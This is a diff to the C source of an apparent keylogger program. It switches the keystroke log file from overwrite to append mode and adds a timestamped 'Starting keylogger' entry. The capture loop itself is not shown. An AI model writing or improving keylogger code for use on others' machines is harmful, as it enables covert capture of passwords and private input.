@@ -5,8 +5,6 @@
  *
  * 2013 Gabriel Alonso <gbr.alonso@gmail.com>
  * 
- * @TODO: autodetect keyboard map
- *
  */
 
 #include <stdlib.h>
@@ -19,6 +17,7 @@
 #include <sys/types.h>
 #include "get_keyboard.h"
 #include "tasmania.h"
+#include <time.h>
 
 int main(int argc, char *argv[])
 {
@@ -96,7 +95,7 @@ int main(int argc, char *argv[])
 
 	if (log_file && strlen(log_file) != 1 && log_file[0] != '-' && log_file[1] != '\0') 
 	{
-		if (!(log = fopen(log_file, "w"))) {
+		if (!(log = fopen(log_file, "a"))) {
 			perror("fopen");
 			return EXIT_FAILURE;
 		}
@@ -121,7 +120,16 @@ int main(int argc, char *argv[])
 	if(tasmanize)
 		tasmanizame();
 
-	int zzz = 1;
+
+    time_t rawtime;
+    struct tm *info;
+    char timestring[80];
+    time( &rawtime );
+    strftime(timestring,80,"%Y-%m-%d %H:%M:%S", localtime( &rawtime ));
+
+    fprintf(log, "\n<Starting keylogger:> %s\n", timestring);
+
+    int zzz = 1;
 
 	while (zzz > 0) 
 	{
